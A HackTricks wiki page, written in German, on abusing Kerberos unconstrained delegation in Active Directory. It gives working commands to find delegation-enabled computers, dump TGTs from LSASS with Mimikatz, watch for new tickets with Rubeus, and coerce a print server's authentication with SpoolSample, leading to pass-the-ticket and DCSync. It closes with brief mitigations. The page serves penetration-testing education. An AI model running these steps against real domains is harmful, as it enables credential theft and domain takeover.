# Unconstrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Unconstrained delegation

Dies ist eine Funktion, die ein Domänenadministrator für jeden **Computer** innerhalb der Domäne festlegen kann. Jedes Mal, wenn sich ein **Benutzer** an dem Computer anmeldet, wird eine **Kopie des TGT** dieses Benutzers in das **TGS** gesendet, das vom DC bereitgestellt wird, **und im Speicher in LSASS gespeichert**. Wenn Sie also Administratorrechte auf der Maschine haben, können Sie die **Tickets dumpen und die Benutzer** auf jeder Maschine impersonieren.

Wenn sich also ein Domänenadministrator an einem Computer mit aktivierter Funktion "Unconstrained Delegation" anmeldet und Sie lokale Administratorrechte auf dieser Maschine haben, können Sie das Ticket dumpen und den Domänenadministrator überall impersonieren (Domänenprivilegieneskalation).

Sie können **Computerobjekte mit diesem Attribut finden**, indem Sie überprüfen, ob das Attribut [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) enthält. Sie können dies mit einem LDAP-Filter von ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ tun, was powerview macht:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs erscheinen immer, sind aber für privesc nicht nützlich
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Empfohlene Methode
kerberos::list /export #Eine andere Methode

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Überprüfen Sie alle 10s auf neue TGTs</code></pre>

Laden Sie das Ticket des Administrators (oder des Opferbenutzers) im Speicher mit **Mimikatz** oder **Rubeus für ein** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Weitere Informationen zur Unconstrained Delegation bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Wenn ein Angreifer in der Lage ist, einen Computer zu **kompromittieren, der für "Unconstrained Delegation" erlaubt ist**, könnte er einen **Druckserver** **täuschen**, um sich **automatisch** bei ihm **anzumelden und ein TGT** im Speicher des Servers zu speichern.\
Dann könnte der Angreifer einen **Pass the Ticket-Angriff durchführen, um** das Benutzerkonto des Druckservercomputers zu impersonieren.

Um einen Druckserver dazu zu bringen, sich an einer beliebigen Maschine anzumelden, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Wenn das TGT von einem Domänencontroller stammt, könnten Sie einen [**DCSync-Angriff**](acl-persistence-abuse/#dcsync) durchführen und alle Hashes vom DC erhalten.\
[**Weitere Informationen zu diesem Angriff auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Hier sind weitere Möglichkeiten, um eine Authentifizierung zu erzwingen:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Minderung

* Begrenzen Sie DA/Admin-Anmeldungen auf bestimmte Dienste
* Setzen Sie "Konto ist sensibel und kann nicht delegiert werden" für privilegierte Konten.

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
